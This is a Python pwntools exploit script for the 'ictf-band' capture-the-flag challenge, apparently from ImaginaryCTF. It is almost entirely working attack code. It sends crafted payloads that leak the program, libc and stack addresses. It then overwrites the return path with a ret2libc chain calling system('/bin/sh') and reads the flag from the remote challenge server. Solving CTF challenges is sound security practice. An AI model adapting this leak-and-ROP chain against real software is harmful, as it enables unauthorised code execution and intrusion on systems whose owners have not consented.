#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './ictf-band_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'ictf-band.chal.imaginaryctf.org', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
# breakrva 0x18c0
# breakrva 0x1915
# breakrva 0x1dc1
breakrva 0x20c7
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec ictf-band
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    No canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
#     RUNPATH:  b'.'

def exploit():
    global io
    io = initialize()

    # =============================
    # hypothetical
    # =============================
    io.sendlineafter(b'>>', b'3')
    io.sendlineafter(b':', b'idk')

    # =============================
    # Leak ELF Base
    # =============================
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b':', b'0')
    io.sendlineafter(b':', b'0')
    io.sendafter(b':', b'y')

    payload = b'A' * (8*3-1) + b'B'
    io.sendlineafter(b':', str(len(payload)).encode()) 
    io.sendafter(b':', payload)
    
    io.recvuntil(b'AB')
    elf.address = u64(io.recvline().strip().ljust(8, b'\x00')) - 0x36c1
    io.sendlineafter(b':', b'y')

    # =============================
    # Leak LIBC Base
    # =============================
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b':', b'0')
    io.sendlineafter(b':', b'0')
    io.sendafter(b':', b'y')

    payload = b'A' * (8*2-1) + b'B'
    io.sendlineafter(b':', str(len(payload)).encode()) 
    io.sendafter(b':', payload)
    
    io.recvuntil(b'AB')
    libc.address = u64(io.recvline().strip().ljust(8, b'\x00')) - 0x21b780
    io.sendlineafter(b':', b'y')

    # =============================
    # Leak Stack Addr
    # =============================
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b':', b'0')
    io.sendlineafter(b':', b'0')
    io.sendafter(b':', b'y')

    payload = b'A' * 143 + b'B'
    io.sendlineafter(b':', str(len(payload)).encode()) 
    io.sendafter(b':', payload)
    
    io.recvuntil(b'AB')
    stack = u64(io.recvline().strip().ljust(8, b'\x00'))
    io.sendlineafter(b':', b'y')
    
    # =============================
    # Ret2libc
    # =============================
    offset = 351
    payload = flat({
        offset: [
            stack,
            libc.address + 0x2a3e5,     # pop rdi; ret
            next(libc.search(b'/bin/sh\x00')),
            elf.address + 0x20c7,       # ret
            libc.sym['system'],
        ]
    })

    io.sendlineafter(b'>>', b'4')
    io.sendlineafter(b':', b'idk')
    io.sendlineafter(b':', str(len(payload)).encode()) 
    io.sendafter(b':', payload)

    sleep(0.2)
    io.sendline(b'cat flag.txt')

    log.success('elf base: %#x', elf.address)
    log.success('libc base: %#x', libc.address)
    log.success('stack: %#x', stack)
    io.interactive()
    
if __name__ == '__main__':
    exploit()